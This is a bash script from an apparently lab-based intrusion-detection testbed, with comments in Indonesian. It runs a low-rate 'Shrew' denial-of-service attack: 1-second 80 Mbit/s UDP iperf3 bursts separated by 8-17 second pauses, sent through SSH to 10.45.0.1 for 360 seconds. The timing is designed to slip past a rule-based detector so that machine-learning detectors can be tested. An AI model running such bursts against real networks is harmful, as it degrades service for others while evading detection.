#!/bin/bash
# S6 — LDoS/Shrew: short UDP bursts (1s ON, 8-17s OFF) for 360 seconds.
# Setiap burst terlalu singkat untuk dikonfirmasi rule Stage2 (butuh 5 consecutive).
# Tujuan: menguji apakah LSTM/GRU mendeteksi pola anomali periodik yang lolos rule-based.
# Usage: ldos_shrew.sh <adb_device_id>

set -euo pipefail
source "$(dirname "$0")/../attack_config.env"

DEV="${1:?Usage: ldos_shrew.sh <adb_device_id>}"

if [ "$DEV" = "$DEV1" ]; then
    SSH_PORT="$UE1_SSH_PORT"
else
    SSH_PORT="$UE2_SSH_PORT"
fi

echo "[LDOS] Starting on $DEV via port $SSH_PORT — 1s bursts, 8-17s silence, 360s total"

ssh -p "$SSH_PORT" \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 \
    localhost \
    "bash -s" << 'REMOTE'
TARGET_IP="10.45.0.1"
IPERF_PORT="5201"
END_TIME=$(( $(date +%s) + 360 ))
CYCLE=1
while [ $(date +%s) -lt $END_TIME ]; do
    OFF=$(( RANDOM % 10 + 8 ))
    REMAINING=$(( END_TIME - $(date +%s) ))
    [ $REMAINING -le 0 ] && break
    ON=1
    [ $ON -gt $REMAINING ] && ON=$REMAINING
    echo "[LDOS] Cycle $CYCLE: ON=${ON}s OFF=${OFF}s (remaining=${REMAINING}s)"
    iperf3 -u -c "$TARGET_IP" -p "$IPERF_PORT" -b 80M -t "$ON" --no-delay 2>&1 | tail -1
    sleep "$OFF"
    CYCLE=$(( CYCLE + 1 ))
done
echo "[LDOS] Done. Total cycles: $CYCLE"
REMOTE

echo "[LDOS] SSH session complete."
